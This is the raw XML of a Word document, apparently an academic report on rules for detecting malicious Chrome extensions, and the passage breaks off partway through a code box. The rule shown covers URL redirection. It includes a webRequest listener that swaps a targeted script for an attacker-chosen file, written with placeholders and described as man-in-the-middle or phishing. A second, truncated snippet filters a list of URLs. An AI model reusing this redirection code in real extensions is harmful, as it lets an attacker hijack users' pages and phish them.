                              <w:t>"https://www.replacement file.js"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">        </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>}</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>}</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t>}</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">, </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>{</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>urls</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>: [</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>"https://URL YOU WANT TO MITM/"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>]</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t>}</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">, </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>[</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>"blocking"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>])</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00655814">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0AC143DD" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="00655814" w:rsidRDefault="006A6E3D" w:rsidP="00655814">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="3F08084C" w14:textId="530C2225" w:rsidR="006A6E3D" w:rsidRPr="00655814" w:rsidRDefault="006A6E3D">
                            <w:pPr>
                              <w:rPr>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0825A9" id="_x0000_s1034" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:.35pt;margin-top:28.8pt;width:471.75pt;height:132.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" filled="f" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="6B183178" w14:textId="55C8D0CC" w:rsidR="006A6E3D" w:rsidRPr="00655814" w:rsidRDefault="006A6E3D" w:rsidP="00655814">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                      </w:pPr>
                      <w:proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart"/>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>chrome.webRequest.onBeforeRequest</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>addListener</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">function </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>(details) {</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>if</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">(details.url == </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>"https://file you want to replace.js"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>) {</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">        </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">return </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>{</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">             </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>redirectUrl</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">: </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>"https://www.replacement file.js"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">        </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>}</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>}</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t>}</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">, </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>{</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="9876AA"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>urls</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>: [</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>"https://URL YOU WANT TO MITM/"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>]</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t>}</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t xml:space="preserve">, </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>[</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>"blocking"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>])</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00655814">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0AC143DD" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="00655814" w:rsidRDefault="006A6E3D" w:rsidP="00655814">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="3F08084C" w14:textId="530C2225" w:rsidR="006A6E3D" w:rsidRPr="00655814" w:rsidRDefault="006A6E3D">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00F66EC0" w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Rule 5: URL redirection.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="183"/>
    </w:p>
    <w:p w14:paraId="20C6F916" w14:textId="69F4FBCC" w:rsidR="001175B2" w:rsidRPr="009E02A4" w:rsidRDefault="009E02A4" w:rsidP="009E02A4">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="184" w:name="_Ref514844056"/>
      <w:bookmarkStart w:id="185" w:name="_Toc523071583"/>
      <w:r w:rsidRPr="009E02A4">
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="009E02A4">
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="006A6E3D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="009E02A4">
        <w:t>: URL redirection.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="184"/>
      <w:bookmarkEnd w:id="185"/>
    </w:p>
    <w:p w14:paraId="0C4E736C" w14:textId="0608E060" w:rsidR="00F66EC0" w:rsidRPr="00F66EC0" w:rsidDel="00334F3E" w:rsidRDefault="00F66EC0" w:rsidP="001175B2">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:del w:id="186" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:43:00Z"/>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>This rule is about URL redirection where a listener is used for the URLs the user visits. When the URL matches the page that the attacker has targeted, the extension redirects this URL to an arbitrary one. This attack can be described as a Man-In-The-Middle attack or a phishing technique.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38AEB314" w14:textId="77777777" w:rsidR="00F66EC0" w:rsidRPr="00F66EC0" w:rsidRDefault="00F66EC0" w:rsidP="00334F3E">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:pPrChange w:id="187" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:43:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
    </w:p>
    <w:bookmarkStart w:id="188" w:name="_Toc523071519"/>
    <w:p w14:paraId="2118CCA0" w14:textId="15227E2F" w:rsidR="001175B2" w:rsidRDefault="007652E7" w:rsidP="00F66EC0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251678720" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="47494BB0" wp14:editId="59B6D2C4">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-5715</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>561975</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="5953125" cy="2314575"/>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2314575"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="61B843CB" w14:textId="674F9315" w:rsidR="006A6E3D" w:rsidRPr="007652E7" w:rsidRDefault="006A6E3D" w:rsidP="007652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CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>chrome.webRequest.onBeforeRequest.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>addListener</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b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>function</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>(details) {</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b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">var </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>url = details.url</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">      </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>for</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b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">var </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">i = </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="6897BB"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>0</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">; </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>i &lt; ibneler.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="9876AA"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>length</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t xml:space="preserve">; </w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>i++) {</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b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>if</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>(url.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>indexOf</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>(ibneler.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="9876AA"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                              <w:t>length</w:t>
                            </w:r>
                            <w:r w:rsidRPr="007652E7">
                              <w:rPr>
                                <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
